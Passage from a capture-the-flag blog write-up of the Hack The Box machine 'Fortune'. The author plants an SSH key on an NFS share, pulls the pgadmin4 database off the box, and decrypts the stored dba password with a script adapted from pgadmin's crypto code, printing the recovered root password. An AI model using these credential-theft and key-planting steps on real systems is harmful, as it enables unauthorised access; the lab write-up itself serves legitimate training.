</code></pre></div></div>
<p><br> I already have a user on my box with the <code class="highlighter-rouge">uid</code> 1000 called <code class="highlighter-rouge">rick</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/fortune/mnt# id rick
uid=1000(rick) gid=1000(rick) groups=1000(rick)
root@kali:~/Desktop/HTB/boxes/fortune/mnt#
</code></pre></div></div>
<p><br><img src="/images/hackthebox/fortune/16.png" alt=""><br>
<br> We owned user.
<br></p>
<hr>

<h2 id="privilege-escalation-root-flag">Privilege Escalation, Root Flag</h2>
<p><br> First thing I wanted to do is to get <code class="highlighter-rouge">ssh</code>, luckily I had write access to <code class="highlighter-rouge">authorized_keys</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie$ ls -la
total 22
drwxr-x--- 3 rick rick 512 Nov  6  2018 .
drwxr-xr-x 5 root root 512 Nov  3  2018 ..
-rw-r----- 1 rick rick 771 Oct 11  2018 .cshrc
-rw-r----- 1 rick rick 101 Oct 11  2018 .cvsrc
-rw-r----- 1 rick rick 359 Oct 11  2018 .login
-rw-r----- 1 rick rick 175 Oct 11  2018 .mailrc
-rw------- 1 rick rick 608 Nov  3  2018 mbox
-rw-r----- 1 rick rick 216 Oct 11  2018 .profile
drwx------ 2 rick rick 512 Nov  2  2018 .ssh
-r-------- 1 rick rick  33 Nov  3  2018 user.txt
-rw-r----- 1 rick rick  87 Oct 11  2018 .Xdefaults
rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie$ cd .ssh
rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ ls -la
total 4
drwx------ 2 rick rick 512 Nov  2  2018 .
drwxr-x--- 3 rick rick 512 Nov  6  2018 ..
-rw------- 1 rick rick   0 Oct 11  2018 authorized_keys
rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ 
</code></pre></div></div>
<p><br> I used <code class="highlighter-rouge">ssh-keygen</code> to generate a private and a public key :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/fortune# mkdir ssh
root@kali:~/Desktop/HTB/boxes/fortune# ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/Desktop/HTB/boxes/fortune/ssh/id_rsa
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /root/Desktop/HTB/boxes/fortune/ssh/id_rsa.
Your public key has been saved in /root/Desktop/HTB/boxes/fortune/ssh/id_rsa.pub.
The key fingerprint is:
SHA256:OicgBWZAaEOpjbe8y6qqvgAEJwY0qDKuSuBXQ/Gt+Cs root@kali
The key's randomart image is:
+---[RSA 2048]----+
|%B*  .           |
|=O..  o .        |
|++. .. . .       |
|B o.. . .        |
|=+...+ .S        |
|+.o...o.         |
|oo o  +..        |
|+.o  E +.        |
|%++.  ..         |
+----[SHA256]-----+
root@kali:~/Desktop/HTB/boxes/fortune# cat ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDjxkpA0ZDuhQD+S6db5Vs1jaYcBvQ95b3cIiWihMgHXZC4rMdRVgFhCKaNot9qISpBTnwlP7+NOC0GK7hVw3xDtLuqkTJb8DW2/8dsmsf3TUKX0IkFLz45kZs0eSBfBhl9CYnB5+9A/uQ1UNKufsUQ19sWuzspksvN/PA0aujwEUQgPlMlw+uSlcTxD+zTENVEJoM4cEVE5EvWg/JWYMQLbkob0k5YnDwgr3KdyWOxidsfLNXthd7FYjShVMl2yfW+r1NjJN8mCSE8z8G/GJ9ripwqWzOjgUzDvKIcODnJmt975h6h2oHExipzWj2IUJxPz41HiP3JgeSuDFP87fdz root@kali                               
root@kali:~/Desktop/HTB/boxes/fortune#
</code></pre></div></div>
<p><br> Then I wrote my public key to <code class="highlighter-rouge">authorized_keys</code> and got <code class="highlighter-rouge">ssh</code> as <code class="highlighter-rouge">charlie</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDjxkpA0ZDuhQD+S6db5Vs1jaYcBvQ95b3cIiWihMgHXZC4rMdRVgFhCKaNot9qISpBTnwlP7+NOC0GK7hVw3xDtLuqkTJb8DW2/8dsmsf3TUKX0IkFLz45kZs0eSBfBhl9CYnB5+9A/uQ1UNKufsUQ19sWuzspksvN/PA0aujwEUQgPlMlw+uSlcTxD+zTENVEJoM4cEVE5EvWg/JWYMQLbkob0k5YnDwgr3KdyWOxidsfLNXthd7FYjShVMl2yfW+r1NjJN8mCSE8z8G/GJ9ripwqWzOjgUzDvKIcODnJmt975h6h2oHExipzWj2IUJxPz41HiP3JgeSuDFP87fdz root@kali" &gt;&gt; authorized_keys 
rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ cd ../../../ssh/
rick@kali:/root/Desktop/HTB/boxes/fortune/ssh$ su
Password: 
root@kali:~/Desktop/HTB/boxes/fortune/ssh# ssh charlie@fortune.htb -i id_rsa
OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.
fortune$ 
</code></pre></div></div>
<p><br> In the home directory of <code class="highlighter-rouge">charlie</code> there was a file called <code class="highlighter-rouge">mbox</code> which had an email from <code class="highlighter-rouge">bob</code> to <code class="highlighter-rouge">charlie</code> thanking him for setting up <code class="highlighter-rouge">pgadmin4</code> for him and also telling him that he set the <code class="highlighter-rouge">dba</code> password to the same as root password :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fortune$ ls -al
total 44
drwxr-x---  3 charlie  charlie  512 Nov  5  2018 .
drwxr-xr-x  5 root     wheel    512 Nov  2  2018 ..
-rw-r-----  1 charlie  charlie   87 Oct 11  2018 .Xdefaults
-rw-r-----  1 charlie  charlie  771 Oct 11  2018 .cshrc
-rw-r-----  1 charlie  charlie  101 Oct 11  2018 .cvsrc
-rw-r-----  1 charlie  charlie  359 Oct 11  2018 .login
-rw-r-----  1 charlie  charlie  175 Oct 11  2018 .mailrc
-rw-r-----  1 charlie  charlie  216 Oct 11  2018 .profile
drwx------  2 charlie  charlie  512 Nov  2  2018 .ssh
-rw-------  1 charlie  charlie  608 Nov  3  2018 mbox
-r--------  1 charlie  charlie   33 Nov  3  2018 user.txt
fortune$ cat mbox                                                                                                                                                                                                 
From bob@fortune.htb Sat Nov  3 11:18:51 2018
Return-Path: &lt;bob@fortune.htb&gt;
Delivered-To: charlie@fortune.htb
Received: from localhost (fortune.htb [local])
        by fortune.htb (OpenSMTPD) with ESMTPA id bf12aa53
        for &lt;charlie@fortune.htb&gt;;
        Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
From:  &lt;bob@fortune.htb&gt;
Date: Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
To: charlie@fortune.htb
Subject: pgadmin4
Message-ID: &lt;196699abe1fed384@fortune.htb&gt;
Status: RO

Hi Charlie,

Thanks for setting-up pgadmin4 for me. Seems to work great so far.
BTW: I set the dba password to the same as root. I hope you don't mind.

Cheers,

Bob

fortune$ 
</code></pre></div></div>
<p><br>  Note : <a href="https://www.pgadmin.org/" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">pgadmin</code></a> is an administration and development platform for <code class="highlighter-rouge">PostgreSQL</code>. 
<br> Earlier when we got the elevated network access there was an <code class="highlighter-rouge">http</code> port for <code class="highlighter-rouge">pgadmin4</code> so I checked its web directory in <code class="highlighter-rouge">/var/appsrv</code> and the database was there :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fortune$ cd /var/appsrv/                                                                                                                                                                                          
fortune$ ls -la
total 20
drwxr-xr-x   5 root       wheel     512 Nov  2  2018 .
drwxr-xr-x  24 root       wheel     512 Nov  2  2018 ..
drwxr-xr-x   5 _fortune   _fortune  512 Aug  2 09:15 fortune
drwxr-x---   4 _pgadmin4  wheel     512 Nov  3  2018 pgadmin4
drwxr-xr-x   4 _sshauth   _sshauth  512 Feb  3 05:08 sshauth
fortune$ cd pgadmin4/                                                                                                                                                                                             
fortune$ ls -la
total 252
drwxr-x---  4 _pgadmin4  wheel     512 Nov  3  2018 .
drwxr-xr-x  5 root       wheel     512 Nov  2  2018 ..
-rw-r-----  1 _pgadmin4  wheel  118784 Nov  3  2018 pgadmin4.db
-rw-r-----  1 _pgadmin4  wheel     479 Nov  3  2018 pgadmin4.ini
drwxr-x---  2 _pgadmin4  wheel     512 Nov  3  2018 sessions
drwxr-x---  3 _pgadmin4  wheel     512 Nov  3  2018 storage
fortune$ 
</code></pre></div></div>
<p><br> I downloaded it on my machine :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/fortune/ssh# scp -i id_rsa charlie@fortune.htb:/var/appsrv/pgadmin4/pgadmin4.db ../
pgadmin4.db                                                                                                                                                                      100%  116KB   7.7KB/s   00:15    
root@kali:~/Desktop/HTB/boxes/fortune/ssh# 
</code></pre></div></div>
<p><br> Then I used <code class="highlighter-rouge">strings</code> to see if I can get anything interesting :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/fortune# strings pgadmin4.db
SQLite format 3
indexsqlite_autoindex_debugger_function_arguments_1debugger_function_arguments

----------------
 Removed Output
----------------

ConfigDB
	ConfigDB
bob@fortune.htb$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
charlie@fortune.htb$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ
bob@fortune.htb
3	charlie@fortune.htb

----------------
 Removed Output
----------------

9eSECURITY_PASSWORD_SALTqIhAhRt3xq_dzIEqyJQFmWnymFbO1cZVhbQaTWA-v9Q=9
!eSECRET_KEYR_EFY1hb236guS3jNq1aHyPcruXbjk7Ff-QwL6PMqJM=?
-eCSRF_SESSION_KEYsaQWKx5BCyVZMH2weOiNv3Dsvzh4GchPM16kwBRYPxs=

----------------
 Removed Output
----------------

8postgresdbautUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGzprefer&lt;STORAGE_DIR&gt;/.postgresql/postgresql.crt&lt;STORAGE_DIR&gt;/.postgresql/postgresql.key22

----------------
 Removed Output
----------------
</code></pre></div></div>
<p><br> I got some salted hashes, and most importantly this :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>postgresdba utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz
</code></pre></div></div>
<p><br> This is the db administrator’s password hash and we know that it’s the same as the root password.
<br> <code class="highlighter-rouge">pgadmin</code> is an open-source software so I searched on <code class="highlighter-rouge">github</code> for any cryptography related stuff and found this script called <a href="https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">crypto.py</code></a>.
<br> I took the functions needed to decrypt the hash then I created a script to take the hash/the key and decrypt the hash using the functions from <code class="highlighter-rouge">crypto.py</code>:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
<span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">division</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">six</span>
<span class="kn">from</span> <span class="nn">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.ciphers</span> <span class="kn">import</span> <span class="n">Cipher</span>
<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.ciphers.algorithms</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.ciphers.modes</span> <span class="kn">import</span> <span class="n">CFB8</span>

<span class="n">padding_string</span> <span class="o">=</span> <span class="n">b</span><span class="s">'}'</span>
<span class="n">iv_size</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span> <span class="o">//</span> <span class="mi">8</span>


<span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
    <span class="s">"""Add padding to the key."""</span>

    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">six</span><span class="o">.</span><span class="n">text_type</span><span class="p">):</span>
        <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>

    <span class="c"># Key must be maximum 32 bytes long, so take first 32 bytes</span>
    <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="p">[:</span><span class="mi">32</span><span class="p">]</span>

    <span class="c"># If key size is 16, 24 or 32 bytes then padding is not required</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">32</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">key</span>

    <span class="c"># Add padding to make key 32 bytes long</span>
    <span class="k">return</span> <span class="n">key</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="n">padding_string</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="s">"""
    Decrypt the AES encrypted string.

    Parameters:
        ciphertext -- Encrypted string with AES method.
        key        -- key to decrypt the encrypted string.
    """</span>

    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
    <span class="n">iv</span> <span class="o">=</span> <span class="n">ciphertext</span><span class="p">[:</span><span class="n">iv_size</span><span class="p">]</span>

    <span class="n">cipher</span> <span class="o">=</span> <span class="n">Cipher</span><span class="p">(</span><span class="n">AES</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">key</span><span class="p">)),</span> <span class="n">CFB8</span><span class="p">(</span><span class="n">iv</span><span class="p">),</span> <span class="n">default_backend</span><span class="p">())</span>
    <span class="n">decryptor</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decryptor</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">decryptor</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">[</span><span class="n">iv_size</span><span class="p">:])</span> <span class="o">+</span> <span class="n">decryptor</span><span class="o">.</span><span class="n">finalize</span><span class="p">()</span>

<span class="n">ciphertext</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">"hash : "</span><span class="p">)</span>
<span class="n">key</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">"key : "</span><span class="p">)</span>
<span class="n">password</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span><span class="n">key</span><span class="p">)</span>

<span class="k">print</span> <span class="s">"[*] Password : "</span> <span class="o">+</span> <span class="n">password</span>
</code></pre></div></div>
<p><br> The only thing left is to give the right key, I tried the other hashes I got from the database as a key and <code class="highlighter-rouge">bob</code>’s hash worked :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
</code></pre></div></div>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/fortune# ./decrypt.py 
hash : utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz
key : $pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
[*] Password : R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!
root@kali:~/Desktop/HTB/boxes/fortune# 
</code></pre></div></div>
<p><br><img src="/images/hackthebox/fortune/17.png" alt=""><br>
<br> And we owned root !
<br> That’s it , Feedback is appreciated !
<br> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br> Thanks for reading.
<br>
<br>
<br> Previous Hack The Box write-up : <a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a>
<br> Next Hack The Box write-up : <a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></p>
<hr>


</div>





<div class="related">
  <h2>other posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/hack-the-box/bitlab/">
            Hack The Box - Bitlab
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/hack-the-box/craft/">
            Hack The Box - Craft
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/hack-the-box/smasher2/">
            Hack The Box - Smasher2
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>All Tags</h2>
  <div class="tag-cloud">
<a href="/tag/active-directory/" class="set-1">active-directory</a> <a href="/tag/binary-exploitation/" class="set-2">binary-exploitation</a> <a href="/tag/blockchain/" class="set-1">blockchain</a> <a href="/tag/bsd/" class="set-1">bsd</a> <a href="/tag/buffer-overflow/" class="set-2">buffer-overflow</a> <a href="/tag/c/" class="set-2">c</a> <a href="/tag/code-analysis/" class="set-2">code-analysis</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/drupal/" class="set-1">drupal</a> <a href="/tag/egghunting/" class="set-1">egghunting</a> <a href="/tag/elasticsearch/" class="set-1">elasticsearch</a> <a href="/tag/exploit-development/" class="set-2">exploit-development</a> <a href="/tag/firewall/" class="set-1">firewall</a> <a href="/tag/forensics/" class="set-1">forensics</a> <a href="/tag/ftp/" class="set-1">ftp</a> <a href="/tag/git/" class="set-1">git</a> <a href="/tag/javascript/" class="set-1">javascript</a> <a href="/tag/joomla/" class="set-1">joomla</a> <a href="/tag/js/" class="set-1">js</a> <a href="/tag/kernel-exploitation/" class="set-1">kernel-exploitation</a> <a href="/tag/kibana/" class="set-1">kibana</a> <a href="/tag/latex-injection/" class="set-1">latex-injection</a> <a href="/tag/ldap/" class="set-1">ldap</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/logstash/" class="set-1">logstash</a> <a href="/tag/mmap/" class="set-1">mmap</a> <a href="/tag/networking/" class="set-2">networking</a> <a href="/tag/php/" class="set-2">php</a> <a href="/tag/pivoting/" class="set-1">pivoting</a> <a href="/tag/postgresql/" class="set-1">postgresql</a> <a href="/tag/python/" class="set-3">python</a> <a href="/tag/rbash/" class="set-1">rbash</a> <a href="/tag/rce/" class="set-4">rce</a> <a href="/tag/reverse-engineering/" class="set-1">reverse-engineering</a> <a href="/tag/smart-contracts/" class="set-1">smart-contracts</a> <a href="/tag/smb/" class="set-2">smb</a> <a href="/tag/snmp/" class="set-1">snmp</a> <a href="/tag/solidity/" class="set-1">solidity</a> <a href="/tag/sqli/" class="set-1">sqli</a> <a href="/tag/ssh/" class="set-3">ssh</a> <a href="/tag/ssti/" class="set-1">ssti</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/sudo/" class="set-1">sudo</a> <a href="/tag/suid/" class="set-1">suid</a> <a href="/tag/waf/" class="set-1">waf</a> <a href="/tag/web/" class="set-5">web</a> <a href="/tag/windows/" class="set-2">windows</a> <a href="/tag/windows-exploitation/" class="set-1">windows-exploitation</a> <a href="/tag/winrm/" class="set-1">winrm</a> <a href="/tag/wordpress/" class="set-1">wordpress</a>
</div>
  



      </div>
    </main><footer class="site-footer">
	<center> <script src="https://www.hackthebox.eu/badge/65598"></script> </center>
  <div class="wrapper">
<div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked>
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
if (localStorage.getItem("theme") === null) {
    window.localStorage.setItem('theme', 'dark');
}
const theme = localStorage.getItem('theme');
if (theme === "dark") {
	document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

if (theme === "dark") {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
} else if (theme === "light") {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
} else if  (userPrefers === "dark") {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'dark');
	document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	window.localStorage.setItem('theme', 'dark');
	document.getElementById("theme-toggle").className = 'light';
} else {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'light');
	document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	window.localStorage.setItem('theme', 'light');
	document.getElementById("theme-toggle").className = 'dark';
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    document.documentElement.setAttribute('data-theme', 'light');
		document.documentElement.classList.add('theme--light');
        document.documentElement.classList.remove('theme--dark');
		window.localStorage.setItem('theme', 'light');
	    document.getElementById("theme-toggle").className = 'dark';
	} else {
	    document.documentElement.setAttribute('data-theme', 'dark');
		document.documentElement.classList.add('theme--dark');
        document.documentElement.classList.remove('theme--light');
		window.localStorage.setItem('theme', 'dark');
	    document.getElementById("theme-toggle").className = 'light';
	}
}
</script>
</div>
  
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
